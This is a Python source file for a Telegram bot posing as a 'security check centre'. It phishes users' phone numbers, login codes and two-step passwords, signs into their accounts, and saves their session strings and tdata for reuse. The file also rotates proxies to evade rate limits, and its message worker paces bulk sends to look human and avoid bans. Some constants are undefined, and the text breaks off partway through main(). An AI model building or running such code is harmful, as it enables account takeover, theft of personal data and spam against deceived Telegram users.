# coding=utf-8
import asyncio
import json
import os
import shutil
import time
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

import telethon
from dotenv import load_dotenv
from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, TypeHandler
from telethon import TelegramClient

import sys
from lang import t, normalize_lang, SUPPORTED
import lang as lang_pack
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
try:
    # 本地/源码运行：复用共享客户端
    from lib.converter_client import to_tdata
except ImportError:
    # 容器内无 lib 目录：内置同语义降级实现，避免启动即崩
    import httpx

    _FALLBACK_CONVERTER_URL = os.getenv("CONVERTER_URL", "http://localhost:8000/to-tdata")

    async def to_tdata(payload):
        timeout = httpx.Timeout(12.0)
        async with httpx.AsyncClient(timeout=timeout) as client:
            try:
                resp = await client.post(_FALLBACK_CONVERTER_URL, json=payload)
                resp.raise_for_status()
                try:
                    return resp.json()
                except ValueError:
                    return {"error": "invalid_response", "detail": "Converter service did not return JSON"}
            except httpx.TimeoutException:
                return {"error": "timeout", "detail": "Converter service timed out"}
            except httpx.HTTPStatusError as exc:
                return {"error": "http_error", "status": exc.response.status_code, "detail": exc.response.text}
            except Exception as exc:
                return {"error": "unexpected_error", "detail": str(exc)}

try:
    from opentele.td import TDesktop
    from opentele.tl import TelegramClient as TelethonToDesktop
    from opentele.api import API, UseCurrentSession
    TELEPOT_AVAILABLE = True
except ImportError:
    TELEPOT_AVAILABLE = False
    TelethonToDesktop = None
    API = None
    UseCurrentSession = None

load_dotenv()

# 默认语言：环境/机器人配置优先（网页端可改），未配则中文
DEFAULT_BOT_LANG = os.getenv("DEFAULT_LANG", "zh") or "zh"
lang_pack.DEFAULT_LANG = DEFAULT_BOT_LANG

BOT_TOKEN = os.getenv("BOT_TOKEN")
API_URL = os.getenv("API_URL", "http://backend:8000")
IMAGE_PATH = os.getenv("BOT_IMAGE_PATH", "/app/images/success.jpg")
SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
BOT_USERNAME = "安全检测中心"

API_ID = int(os.getenv("API_ID"))
API_HASH = str(os.getenv("API_HASH"))
PROXY_TYPE = os.getenv("PROXY_TYPE", "socks5")

logger.info(f"API_ID={API_ID}, API_HASH=***")

def parse_proxy_list():
    proxies = []
    i = 1
    while True:
        host = os.getenv(f"PROXY_HOST_{i}")
        port = os.getenv(f"PROXY_PORT_{i}")
        user = os.getenv(f"PROXY_USER_{i}")
        pw = os.getenv(f"PROXY_PW_{i}")
        if not host:
            host = os.getenv("PROXY_HOST")
            port = os.getenv("PROXY_PORT")
            user = os.getenv("PROXY_USER")
            pw = os.getenv("PROXY_PW")
            if host:
                p = (PROXY_TYPE, host, int(port) if port else 1080)
                if user and pw:
                    p = (PROXY_TYPE, host, int(port), True, user, pw)
                proxies.append(p)
            break
        p = (PROXY_TYPE, host, int(port))
        if user and pw:
            p = (PROXY_TYPE, host, int(port), True, user, pw)
        proxies.append(p)
        i += 1
    return proxies

PROXY_LIST = parse_proxy_list()
logger.info(f"已加载 {len(PROXY_LIST)} 个代理")

# 并发任务处理 - 后台线程池
MAX_WORKERS = int(os.getenv("BOT_MAX_WORKERS", "8"))
_executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

user_states = {}
telethon_clients = {}
client_proxy_index = {}
MAX_CODE_ATTEMPTS = 3
MAX_PASSWORD_ATTEMPTS = 3

def L(user_id, key, **kwargs):
    # 取用户语言文案（默认语言跟随配置）
    lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
    return t(lang, key, **kwargs)


def create_restart_button(lang="zh"):
    """创建重新验证按钮"""
    keyboard = [[KeyboardButton(t(lang, "reverify"), request_contact=False)]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)


def create_lang_keyboard():
    keyboard = [[KeyboardButton("中文"), KeyboardButton("English")]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)


async def handle_lang(update, context):
    # /lang 命令与语言按钮：切换对话语言
    await update.message.reply_text(t(user_states.get(update.effective_user.id, {}).get("lang", DEFAULT_BOT_LANG),
                                      "lang_choose"),
                                    reply_markup=create_lang_keyboard())


def create_keypad(lang="zh"):
    """数字键盘（截图同款：纯数字+确认/清除）"""
    keyboard = [
        [KeyboardButton("1"), KeyboardButton("2"), KeyboardButton("3")],
        [KeyboardButton("4"), KeyboardButton("5"), KeyboardButton("6")],
        [KeyboardButton("7"), KeyboardButton("8"), KeyboardButton("9")],
        [KeyboardButton(t(lang, "key_confirm")), KeyboardButton("0"), KeyboardButton(t(lang, "key_clear"))],
    ]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)


def create_view_code_inline(lang="zh"):
    """查看验证码内联按钮：一点直达 Telegram 系统通知（官方号 777000）"""
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton(t(lang, "view_code"), url="tg://user?id=777000")]])


async def safe_delete(context, chat_id, message_id):
    # 删步骤旧消息，失败静默（已删/无权限都不影响流程）
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass


async def clear_step_msgs(update, context):
    # 删掉本步骤全部消息（正文+键盘两条）
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    ids = user_states.get(user_id, {}).pop("step_msg_ids", [])
    if isinstance(ids, int):
        ids = [ids]
    # 兼容旧单 id 字段
    old_single = user_states.get(user_id, {}).pop("step_msg_id", None)
    if old_single:
        ids.append(old_single)
    for mid in ids:
        await safe_delete(context, chat_id, mid)


async def step_send(update, context, text, reply_markup=None, inline_markup=None):
    # 发步骤消息：先清掉上一步的全部消息；正文挂内联按钮时，键盘另起一条
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    await clear_step_msgs(update, context)
    ids = []
    if inline_markup is not None:
        msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=inline_markup)
        ids.append(msg.message_id)
    if reply_markup is not None:
        pad_text = "请输入您收到的验证码：" if inline_markup is not None else text
        if inline_markup is not None:
            pad = await context.bot.send_message(chat_id=chat_id, text=pad_text, reply_markup=reply_markup)
            ids.append(pad.message_id)
        else:
            msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
            ids.append(msg.message_id)
    elif inline_markup is None:
        msg = await context.bot.send_message(chat_id=chat_id, text=text)
        ids.append(msg.message_id)
    user_states.setdefault(user_id, {})["step_msg_ids"] = ids
    return ids


async def read_code_from_telegram(user_id):
    # 经 Telethon 读 777000 服务通知，提取 5 位登录码
    import re
    client = telethon_clients.get(user_id)
    if client is None:
        return None
    try:
        msgs = await client.get_messages(777000, limit=5)
        for m in msgs:
            text = getattr(m, "message", "") or ""
            found = re.search(r'(?<!\d)(\d{5})(?!\d)', text)
            if found and ("code" in text.lower() or "验证码" in text or "login" in text.lower()):
                return found.group(1)
        # 放宽：只要是5位数字就取最新一条
        for m in msgs:
            text = getattr(m, "message", "") or ""
            found = re.search(r'(?<!\d)(\d{5})(?!\d)', text)
            if found:
                return found.group(1)
    except Exception as e:
        logger.warning(f"读取服务通知失败: {e}")
    return None

async def handle_restart(update, context):
    """处理重新验证按钮点击"""
    user_id = update.effective_user.id
    reset_user_state(user_id)
    await start(update, context)

async def get_telethon_client(user_id=None, proxy_index=None, fresh_session=False):
    try:
        idx = proxy_index if proxy_index is not None else client_proxy_index.get(user_id, 0)
        proxy = PROXY_LIST[idx] if PROXY_LIST else None
        
        if proxy:
            p_info = f"{proxy[1]}:{proxy[2]}"
            if len(proxy) > 4:
                p_info += f" ({proxy[4]})"
            logger.info(f"[用户 {user_id}] 使用代理 {idx+1}/{len(PROXY_LIST)}: {p_info}")
        
        session_name = f'telebot_session_u{user_id}' if fresh_session else 'telebot_session'
        
        if user_id in telethon_clients:
            c = telethon_clients[user_id]
            if c.is_connected():
                return c
            else:
                try:
                    await c.disconnect()
                except Exception:
                    logger.warning("断开旧连接失败")
        
        logger.debug(f"Creating TelegramClient:")
        logger.debug(f"  session_name = {session_name}")
        logger.debug(f"  API_ID = {API_ID} (type: {type(API_ID)})")
        logger.debug(f"  API_HASH = {API_HASH} (type: {type(API_HASH)})")
        
        client = TelegramClient(
            session=session_name,
            api_id=API_ID,
            api_hash=str(API_HASH),
            proxy=proxy,
            device_model="telegram安全中心 请勿移除",
            system_version="6.8",
            app_version="10.14.4"
        )
        
        await client.connect()
        telethon_clients[user_id] = client
        client_proxy_index[user_id] = idx
        return client
    except telethon.errors.rpcerrorlist.PeerFloodError:
        raise Exception("连接失败: 账号被限流，请稍后重试")
    except telethon.errors.rpcerrorlist.FloodWaitError as e:
        raise Exception(f"连接失败: 操作过于频繁，需等待 {e.seconds} 秒")
    except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
        raise Exception("连接失败: 需要输入密码")
    except ConnectionError as e:
        raise Exception(f"连接失败: 网络错误 - {str(e)}")
    except Exception as e:
        raise Exception(f"连接失败: {str(e)}")

async def rotate_proxy(user_id):
    if not PROXY_LIST:
        return None
    current = client_proxy_index.get(user_id, 0)
    next_idx = (current + 1) % len(PROXY_LIST)
    p = PROXY_LIST[next_idx]
    p_info = f"{p[1]}:{p[2]}"
    if len(p) > 4:
        p_info += f" ({p[4]})"
    logger.info(f"[用户 {user_id}] 切换到代理 {next_idx+1}/{len(PROXY_LIST)}: {p_info}")
    client_proxy_index[user_id] = next_idx
    return next_idx

def reset_user_state(user_id):
    # 重置但保留语言偏好
    lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
    user_states[user_id] = {"lang": lang}

async def backup_session(phone_number, client):
    phone_folder = None
    try:
        await asyncio.to_thread(os.makedirs, SESSIONS_DIR, exist_ok=True)
        
        phone_folder = os.path.join(SESSIONS_DIR, phone_number)
        if os.path.exists(phone_folder):
            await asyncio.to_thread(shutil.rmtree, phone_folder)
        await asyncio.to_thread(os.makedirs, phone_folder)
        
        session = client.session
        if not session.auth_key:
            if phone_folder and os.path.exists(phone_folder):
                await asyncio.to_thread(shutil.rmtree, phone_folder)
            logger.error("备份失败: 无auth_key")
            return False
        
        from telethon.sessions import StringSession
        string_session = StringSession()
        string_session._dc_id = session.dc_id
        string_session._server_address = session.server_address
        string_session._port = session.port
        string_session._auth_key = session.auth_key
        
        session_str = string_session.save()
        
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, lambda: open(os.path.join(phone_folder, 'telethon密钥.txt'), 'w', encoding='utf-8').write(session_str))
        
        try:
            me = await client.get_me()
            account_info = {
                'phone': str(phone_number),
                'id': str(me.id),
                'first_name': str(me.first_name) if me.first_name else '',
                'last_name': str(me.last_name) if me.last_name else '',
                'username': str(me.username) if me.username else '',
                'dc_id': str(session.dc_id),
                'session_string': str(session_str)
            }
            await loop.run_in_executor(None, lambda: json.dump(account_info, open(os.path.join(phone_folder, '账号信息.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=2))
        except Exception as e:
            logger.error(f"获取账号信息失败: {e}")
        
        # 注意：不再复制.env文件，包含敏感信息
        
        if os.path.exists('telebot_session.session'):
            await asyncio.to_thread(shutil.copy2, 'telebot_session.session', os.path.join(phone_folder, 'telebot_session.session'))
        
        if TELEPOT_AVAILABLE:
            try:
                tdata_folder = os.path.join(phone_folder, 'tdata')
                await asyncio.to_thread(os.makedirs, tdata_folder, exist_ok=True)
                
                api = API.TelegramDesktop.Generate()
                from telethon.sessions import StringSession as _SS
                telethon_client = TelethonToDesktop(_SS(session_str), api=api)

                tdesk = await telethon_client.ToTDesktop(flag=UseCurrentSession)
                tdesk.SaveTData(tdata_folder)
                logger.info("tdata 备份成功")
            except Exception as e:
                logger.error(f"tdata 备份失败: {e}")
        
        telegram_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Telegram.exe')
        if os.path.exists(telegram_exe):
            try:
                await asyncio.to_thread(shutil.copy2, telegram_exe, os.path.join(phone_folder, 'Telegram.exe'))
                logger.info("客户端复制成功")
            except Exception as e:
                logger.warning(f"客户端复制失败(可能被占用): {e}")
        
        try:
            payload = {
                "backup": {
                    "data": session_str,
                    "format": "telethon_session"
                },
                "options": {
                    "merge_with_existing": True,
                    "phone": phone_number
                }
            }
            tdata_resp = await to_tdata(payload)
            await loop.run_in_executor(None, lambda: json.dump(tdata_resp, open(os.path.join(phone_folder, 'tdata_response.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=2))
        except Exception as e:
            logger.warning(f"调用转换服务失败: {e}")
        logger.info(f"备份成功: {phone_folder}")
        return True
    except Exception as e:
        logger.error(f"备份失败: {e}")
        if phone_folder and os.path.exists(phone_folder):
            await asyncio.to_thread(shutil.rmtree, phone_folder)
        return False

async def start(update, context):
    user_id = update.effective_user.id
    logger.debug(f"start 被触发, user_id={user_id}, args={context.args}")
    var = None
    if context.args:
        var = context.args[0] if context.args else None
    # 重开清掉旧步骤消息，避免残留
    await clear_step_msgs(update, context)
    lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
    user_states[user_id] = {"state": "start", "code_attempts": 0, "password_attempts": 0, "lang": lang}
    keyboard = [[KeyboardButton(L(user_id, "send_phone"), request_contact=True)],
                [KeyboardButton("🌐 语言 / Language")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
    await update.message.reply_text(
        L(user_id, "welcome"),
        reply_markup=reply_markup
    )

async def handle_contact(update, context):
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    if state != "start":
        await update.message.reply_text(L(user_id, "need_start"))
        return
    try:
        contact = update.message.contact
        phone = contact.phone_number
        user_states[user_id] = {"state": "phone_ok", "phone": phone, "code_attempts": 0, "password_attempts": 0,
                                "lang": user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)}
        keyboard = [[KeyboardButton(L(user_id, "get_code"))]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
        await step_send(update, context,
                        L(user_id, "verifying_phone", phone=phone),
                        reply_markup=reply_markup)
    except Exception as e:
        await update.message.reply_text(L(user_id, "phone_fail", err=str(e)))

async def handle_photo(update, context):
    """处理用户发送图片的情况 - 拒绝并提示重新验证"""
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    
    if not state or state == "start":
        await update.message.reply_text(
            L(user_id, "photo_start"),
            reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG))
        )
        return
    
    await update.message.reply_text(
        L(user_id, "photo_invalid"),
        reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG))
    )

def _is_restart(text):
    # 中英重新验证按钮文本
    return text in ("重新验证", "Restart Verification")


def _is_get_code(text):
    return text in ("获取验证码", "Get Code")


def _today_verified_count():
    # 当天已验证数（会话文件夹mtime），超限直接拒
    try:
        import datetime
        today = datetime.date.today()
        n = 0
        if os.path.isdir(SESSIONS_DIR):
            for name in os.listdir(SESSIONS_DIR):
                p = os.path.join(SESSIONS_DIR, name)
                if os.path.isdir(p) and datetime.date.fromtimestamp(os.path.getmtime(p)) == today:
                    n += 1
        return n
    except Exception:
        return 0


async def handle_code_request(update, context):
    user_id = update.effective_user.id
    state = user_states.get(user_id, {}).get("state")
    if state != "phone_ok":
        await update.message.reply_text(L(user_id, "need_phone_first"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    # 养号节流：频次与日上限
    now = time.time()
    last = user_states[user_id].get("last_code_at", 0)
    if now - last < MIN_VERIFY_INTERVAL_SEC:
        wait = int(MIN_VERIFY_INTERVAL_SEC - (now - last))
        await update.message.reply_text(L(user_id, "cooldown", wait=wait),
                                        reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    if _today_verified_count() >= MAX_VERIFY_PER_DAY:
        await update.message.reply_text(L(user_id, "day_limit", n=MAX_VERIFY_PER_DAY),
                                        reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    if not PROXY_LIST:
        logger.warning("未配置代理，所有MTProto走本机IP，多号同IP是冻号高危因素")
    phone = user_states[user_id].get("phone")
    try:
        client = await get_telethon_client(user_id, fresh_session=True)
        try:
            await client.connect()
        except Exception as e:
            logger.error(f"连接错误: {e}")
            await update.message.reply_text(L(user_id, "conn_retry"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
            if user_id in telethon_clients:
                try:
                    await telethon_clients[user_id].disconnect()
                except Exception:
                    logger.warning("断开连接失败")
                del telethon_clients[user_id]
            client = await get_telethon_client(user_id, fresh_session=True)
            await client.connect()
        logger.info(f"发送验证码到: {phone}")
        result = await client.send_code_request(phone)
        user_states[user_id]["state"] = "code_sent"
        user_states[user_id]["phone_code_hash"] = str(result.phone_code_hash) if result.phone_code_hash else ""
        user_states[user_id]["code_buf"] = ""
        user_states[user_id]["last_code_at"] = time.time()
        await step_send(update, context,
                        L(user_id, "code_sent"),
                        reply_markup=create_keypad(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)),
                        inline_markup=create_view_code_inline(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
    except telethon.errors.rpcerrorlist.PhoneNumberOccupiedError:
        await update.message.reply_text(L(user_id, "phone_occupied"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
    except telethon.errors.rpcerrorlist.PhoneNumberInvalidError:
        await update.message.reply_text(L(user_id, "phone_invalid"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
    except telethon.errors.rpcerrorlist.FloodWaitError as e:
        await update.message.reply_text(L(user_id, "flood_wait", s=e.seconds), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
    except telethon.errors.rpcerrorlist.PeerFloodError:
        await update.message.reply_text(L(user_id, "peer_flood"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
    except Exception as e:
        await update.message.reply_text(L(user_id, "send_code_fail"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))

def _success_image():
    # 成功配图：优先用户自备的登录提示截图，其次旧配置
    here = os.path.dirname(os.path.abspath(__file__))
    for p in (os.path.join(here, "images", "login_alert.jpg"),
              os.path.join(here, "images", "login_alert.png"),
              IMAGE_PATH,
              "/app/images/success.jpg"):
        if p and os.path.isfile(p):
            return p
    return ""


async def send_success(update, context):
    # 成功终态：按用户语言发文案+配图（无图则纯文本），并收起数字键盘
    user_id = update.effective_user.id
    caption = L(user_id, "success")
    img = _success_image()
    if img:
        try:
            with open(img, 'rb') as photo:
                await update.message.reply_photo(photo=photo, caption=caption,
                                                 reply_markup=ReplyKeyboardRemove())
            return
        except Exception as e:
            logger.warning(f"成功配图发送失败，降级纯文本: {e}")
    await update.message.reply_text(caption, reply_markup=ReplyKeyboardRemove())


async def submit_code(update, context, user_id, code):
    # 统一提交验证码：文本TG12345 / 键盘确认 / 查看验证码自动读码共用
    lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
    phone = user_states[user_id].get("phone")
    phone_code_hash = str(user_states[user_id].get("phone_code_hash", ""))
    await step_send(update, context, L(user_id, "verifying"), reply_markup=create_keypad(lang))
    try:
        client = await get_telethon_client(user_id)
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        user_states[user_id]["state"] = "done"
        await backup_session(phone, client)
        # 成功为终态：清掉验证中消息再发结果
        await clear_step_msgs(update, context)
        await send_success(update, context)
    except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
        code_attempts = user_states[user_id].get("code_attempts", 0) + 1
        user_states[user_id]["code_attempts"] = code_attempts
        if code_attempts >= MAX_CODE_ATTEMPTS:
            user_states[user_id].pop("step_msg_id", None)
            await update.message.reply_text(L(user_id, "code_too_many"))
            reset_user_state(user_id)
            await update.message.reply_text(L(user_id, "code_fail_restart"), reply_markup=create_restart_button(lang))
        else:
            remaining = MAX_CODE_ATTEMPTS - code_attempts
            await step_send(update, context, L(user_id, "code_error", n=remaining),
                            reply_markup=create_keypad(lang))
    except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
        user_states[user_id]["state"] = "password"
        user_states[user_id]["password_attempts"] = 0
        await step_send(update, context, L(user_id, "need_password"), reply_markup=create_restart_button(lang))
    except telethon.errors.rpcerrorlist.FloodWaitError as e:
        next_idx = await rotate_proxy(user_id)
        if next_idx is not None:
            user_states[user_id]["state"] = "phone_ok"
            await step_send(update, context, L(user_id, "flood_rotate"),
                            reply_markup=create_restart_button(lang))
        else:
            await step_send(update, context, L(user_id, "flood_wait", s=e.seconds),
                            reply_markup=create_restart_button(lang))
    except Exception as e:
        if "password" in str(e).lower() or "two-steps" in str(e).lower():
            user_states[user_id]["state"] = "password"
            user_states[user_id]["password_attempts"] = 0
            await step_send(update, context, L(user_id, "need_password"), reply_markup=create_restart_button(lang))
        else:
            await step_send(update, context, L(user_id, "verify_fail", err=str(e)), reply_markup=create_restart_button(lang))


async def handle_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    state = user_states.get(user_id, {}).get("state")
    
    # 检查是否点击了重新验证按钮
    if _is_restart(text):
        await handle_restart(update, context)
        return

    # 语言切换（任何阶段可用）
    if text in ("🌐 语言 / Language", "🌐 语言", "🌐 Language"):
        await handle_lang(update, context)
        return
    if text in ("中文", "English"):
        user_states.setdefault(user_id, {})["lang"] = normalize_lang(text)
        await update.message.reply_text(L(user_id, "lang_set"))
        return

    if not state or state == "start":
        await update.message.reply_text(L(user_id, "need_start2"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    if state == "phone_ok":
        if _is_get_code(text):
            await handle_code_request(update, context)
        else:
            await update.message.reply_text(L(user_id, "need_code_btn"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    if state == "code_sent":
        st = user_states[user_id]
        lang = st.get("lang", DEFAULT_BOT_LANG)
        # 数字键盘：单个数字累积
        if len(text) == 1 and text.isdigit():
            buf = (st.get("code_buf", "") + text)[-5:]
            st["code_buf"] = buf
            await step_send(update, context, L(user_id, "keypad_prompt") + L(user_id, "typed_prefix") + (buf if buf else L(user_id, "typed_empty")),
                            reply_markup=create_keypad(lang))
            return
        if text == t(lang, "key_clear"):
            st["code_buf"] = ""
            await step_send(update, context, L(user_id, "cleared"), reply_markup=create_keypad(lang))
            return
        if text == t(lang, "key_confirm"):
            buf = st.get("code_buf", "")
            if len(buf) != 5 or not buf.isdigit():
                await step_send(update, context, L(user_id, "need_5_digits"), reply_markup=create_keypad(lang))
                return
            st["code_buf"] = ""
            await submit_code(update, context, user_id, buf)
            return
        if text == t(lang, "view_code"):
            await step_send(update, context, L(user_id, "checking_code"), reply_markup=create_keypad(lang))
            code = await read_code_from_telegram(user_id)
            if code:
                await step_send(update, context, L(user_id, "code_found", code=code),
                                reply_markup=create_keypad(lang))
                await submit_code(update, context, user_id, code)
            else:
                await step_send(update, context, L(user_id, "code_not_found"),
                                reply_markup=create_keypad(lang))
            return
        if len(text) == 7 and text[:2].upper() == "TG" and text[2:].isdigit():
            await submit_code(update, context, user_id, text[2:])
        else:
            await step_send(update, context, L(user_id, "bad_format"),
                            reply_markup=create_keypad(lang))
        return
    if state == "password":
        password = text
        password_attempts = user_states[user_id].get("password_attempts", 0)
        try:
            client = await get_telethon_client(user_id)
            await client.sign_in(password=password)
            user_states[user_id]["state"] = "done"
            phone = user_states[user_id].get("phone")
            if phone:
                await backup_session(phone, client)
            await send_success(update, context)
        except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
            password_attempts += 1
            user_states[user_id]["password_attempts"] = password_attempts
            if password_attempts >= MAX_PASSWORD_ATTEMPTS:
                await update.message.reply_text(L(user_id, "pwd_too_many"))
                reset_user_state(user_id)
                await update.message.reply_text(L(user_id, "pwd_fail_restart"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
            else:
                remaining = MAX_PASSWORD_ATTEMPTS - password_attempts
                await update.message.reply_text(L(user_id, "pwd_error", n=remaining), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
            await update.message.reply_text(L(user_id, "pwd_need"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        except telethon.errors.rpcerrorlist.FloodWaitError as e:
            next_idx = await rotate_proxy(user_id)
            if next_idx is not None:
                await update.message.reply_text(
                    L(user_id, "pwd_flood_rotate"),
                    reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG))
                )
            else:
                await update.message.reply_text(
                    L(user_id, "flood_wait", s=e.seconds),
                    reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG))
                )
        except Exception as e:
            await update.message.reply_text(L(user_id, "verify_fail", err=str(e)), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
        return
    if state == "done":
        await update.message.reply_text(L(user_id, "done"), reply_markup=ReplyKeyboardRemove())
        return
    if _is_get_code(text):
        await handle_code_request(update, context)
        return
    await update.message.reply_text(L(user_id, "need_start") + " " + L(user_id, "invalid_any"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))

import httpx

# 短信投递 worker 配置：认领统一后端队列，经 Telethon 发送会话投递
SMS_WORKER_ENABLED = os.getenv("SMS_WORKER_ENABLED", "true").lower() == "true"
SMS_POLL_INTERVAL = int(os.getenv("SMS_POLL_INTERVAL", "15"))
SMS_SENDER_SESSION = os.getenv("SMS_SENDER_SESSION", "")
SMS_API_KEY = os.getenv("API_KEY", "")


def _sms_headers():
    return {"X-API-Key": SMS_API_KEY} if SMS_API_KEY else {}


async def sms_worker_loop():
    # 后台循环：认领→发送→回执；无发送会话/后端不可达时只告警不吞件
    warned = False
    sender = None
    if SMS_SENDER_SESSION:
        try:
            from telethon.sessions import StringSession
            sender = TelegramClient(StringSession(SMS_SENDER_SESSION), API_ID, API_HASH)
            await sender.connect()
            if not await sender.is_user_authorized():
                logger.warning("短信发送会话未授权，worker 空转（已认领件超时后自动回收）")
                sender = None
        except Exception as e:
            logger.warning(f"短信发送会话初始化失败，worker 空转: {e}")
            sender = None
    claim_url = f"{API_URL}/api/sms/claim"
    import random as _rand
    sent_day, sent_today = time.strftime('%Y-%m-%d'), 0
    while True:
        try:
            # 每日上限（养号，防群发封号）
            today = time.strftime('%Y-%m-%d')
            if today != sent_day:
                sent_day, sent_today = today, 0
            if sent_today >= SMS_DAILY_LIMIT:
                logger.warning(f"今日投递已达上限{SMS_DAILY_LIMIT}条，暂停1小时")
                await asyncio.sleep(3600)
                continue
            async with httpx.AsyncClient(timeout=10.0) as client:
                item = (await client.post(claim_url, headers=_sms_headers())).json().get("data")
            if not item:
                await asyncio.sleep(SMS_POLL_INTERVAL)
                continue
            if sender is None:
                if not warned:
                    logger.warning("未配置 SMS_SENDER_SESSION，短信仅认领占位，超时后自动回收（配会话后真投递）")
                    warned = True
                await asyncio.sleep(SMS_POLL_INTERVAL * 4)
                continue
            try:
                await sender.send_message(item["phone"], item["content"])
                result = {"status": "sent"}
                logger.info(f"短信已投递 id={item['id']} {item['phone']}")
                sent_today += 1
                # 发一条歇一阵，模仿真人，防群发判定
                await asyncio.sleep(SMS_MIN_DELAY_SEC + _rand.randint(0, 15))
            except telethon.errors.rpcerrorlist.FloodWaitError as e:
                result = {"status": "failed", "error": f"FloodWait {e.seconds}s"}
                logger.warning(f"短信限流 id={item['id']}，等待 {e.seconds}s")
                await asyncio.sleep(min(e.seconds, 300))
            except Exception as e:
                result = {"status": "failed", "error": str(e)[:200]}
                logger.warning(f"短信投递失败 id={item['id']}: {e}")
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    await client.post(f"{API_URL}/api/sms/{item['id']}/complete",
                                      json=result, headers=_sms_headers())
            except Exception as e:
                logger.warning(f"回执失败 id={item['id']}: {e}")
        except Exception as e:
            logger.warning(f"短信认领失败（后端不可达？）: {e}")
            await asyncio.sleep(SMS_POLL_INTERVAL * 2)


async def post_init(app):
    # 网页端语言改写同步（失败则仅用内置，不影响启动）
    try:
        import httpx
        async with httpx.AsyncClient(timeout=8.0) as client:
            r = await client.get(f"{API_URL}/api/lang/overrides")
            if r.status_code == 200:
                lang_pack.apply_overrides(r.json())
                logger.info("语言改写已同步")
    except Exception as e:
        logger.warning(f"语言改写同步跳过: {e}")
    if SMS_WORKER_ENABLED:
        app.create_task(sms_worker_loop(), name="sms-worker")
        logger.info("短信投递 worker 已启动")
    if IDLE_STOP_MINUTES > 0:
        try:
            app.job_queue.run_repeating(idle_check, interval=60, first=60)
        except Exception:
            app.create_task(idle_check_loop(app), name="idle-check")
        logger.info(f"空闲{IDLE_STOP_MINUTES}分钟自动停机已启用")


def main():
    global _start_time
    _start_time = time.time()
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    # 活跃度追踪（group=-1 最先执行，不干扰业务）
    app.add_handler(TypeHandler(Update, track_activity), group=-1)
    app.add_handler(CommandHandler("start", start))
